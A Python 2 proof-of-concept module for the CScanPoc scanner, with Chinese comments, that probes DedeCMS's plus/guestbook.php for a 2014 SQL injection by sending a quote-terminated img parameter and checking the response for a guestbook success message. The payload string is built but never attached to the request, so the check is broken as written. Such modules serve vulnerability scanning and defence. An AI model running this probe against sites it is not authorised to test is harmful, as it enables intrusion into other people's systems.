# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0043_p' # 平台漏洞编号，留空
    name = 'DedeCMS plus/guestbook.php sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-02-26'  # 漏洞公布时间
    desc = '''
        DedeCMS 在/plus/guestbook.php中存在注入漏洞，可直接发布留言。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1319/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd886b9e6-756d-44df-abb1-7d2917afa578'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #把Sverification_code改成你的验证码就哦了
            verification_code = 'aaaa'
            payload = '/dede/plus/guestbook.php'
            data = "?action=save&validate={verification_code}&msg=1&uname=1&img=111'".format(
                verification_code=verification_code)
            url = self.target + payload
            r = requests.get(url) 

            if r.status_code == 200 and '111' in r.text and u'留言发布成功' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()